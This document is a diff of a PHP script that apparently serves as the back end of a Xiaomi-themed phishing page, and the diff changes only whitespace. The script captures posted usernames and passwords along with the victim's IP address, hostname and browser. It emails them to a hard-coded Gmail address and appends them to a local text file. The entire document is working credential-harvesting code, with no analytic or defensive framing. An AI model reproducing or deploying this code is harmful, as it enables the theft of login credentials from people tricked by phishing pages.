@@ -1,23 +1,23 @@
 <?php
 
-$emailstosend = "gcx.apple@gmail.com";
+$emailstosend ="gcx.apple@gmail.com";
  $ip = $_SERVER['REMOTE_ADDR'];
  $id = $_POST['username'];
  $pass = $_POST['password'];
 
- if($id != "" & $pass != ""){
+ if($id !="" & $pass !=""){
 
 
-$subj = "$ip XIAOMI";
- $msg = " --------------------Start----------------------\n
+$subj ="$ip XIAOMI";
+ $msg =" --------------------Start----------------------\n
   USER ID: $id \n
   PASS: $pass \n
-  HOST    : ".gethostbyaddr($ip)."
-  BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
+  HOST    :".gethostbyaddr($ip)."
+  BROWSER :".$_SERVER['HTTP_USER_AGENT']."
   IP: $ip \n --------------------END----------------------";
-  mail("$emailstosend", "$subj", "$msg");
+  mail("$emailstosend","$subj","$msg");
 
-  $myfile = fopen("z.txt", "a") or die("Unable to open file!");
+  $myfile = fopen("z.txt","a") or die("Unable to open file!");
 $txt = $msg;
 fwrite($myfile, $txt);
 fclose($myfile);
